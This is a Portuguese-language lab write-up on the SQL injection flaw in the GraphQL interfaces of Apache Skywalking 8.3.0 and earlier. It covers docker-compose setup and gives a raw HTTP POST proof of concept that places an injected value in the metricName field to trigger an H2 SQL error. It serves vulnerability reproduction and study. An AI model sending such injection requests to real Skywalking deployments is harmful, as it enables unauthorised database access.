# Apache Skywalking 8.3.0 SQL Injection Vulnerability

Ferramenta de monitoramento de desempenho de aplicativos para sistemas distribuídos, especialmente projetada para microsserviços, arquiteturas nativas de nuvem e baseadas em contêiner (Docker, Kubernetes, Mesos).

Nas interfaces GraphQL do Apache Skywalking 8.3.0 e anteriores, há uma vulnerabilidade de injeção SQL do banco de dados H2.

Links de referência:

- https://mp.weixin.qq.com/s/hB-r523_4cM0jZMBOt6Vhw
- https://github.com/apache/skywalking/commit/0bd81495965d801315dd7417bb17333ae0eccf3b#diff-ec87a1cdf66cdb37574d9eafd4d72d99ed94a38c4a8ff2aa9c7b8daeff502a2c

## Ambiente de vulnerabilidade

Execute o seguinte comando para iniciar um Apache Skywalking 8.3.0:

```
docker-compose up -d
```

Depois que o ambiente for iniciado, visite `http://your-ip:8080` para ver a página Skywalking.

## Prova de Conceito

Eu uso o aplicativo de desktop do GraphiQL para enviar a seguinte consulta do GraphQL:

![](1.png)

Pode-se ver que a instrução SQL gerou erro, e o valor do parâmetro `metricName` foi injetado após `from`.

A solicitação HTTP desta consulta do GraphQL é:

```
POST /graphql HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 336

{
    "query":"query queryLogs($condition: LogQueryCondition) {
  queryLogs(condition: $condition) {
    total
    logs {
      serviceId
      serviceName
      isError
      content
    }
  }
}
",
    "variables":{
        "condition":{
            "metricName":"sqli",
            "state":"ALL",
            "paging":{
                "pageSize":10
            }
        }
    }
}
```

Para exploração mais aprofundada, você pode pesquisar por si mesmo e enviar PR para nós.
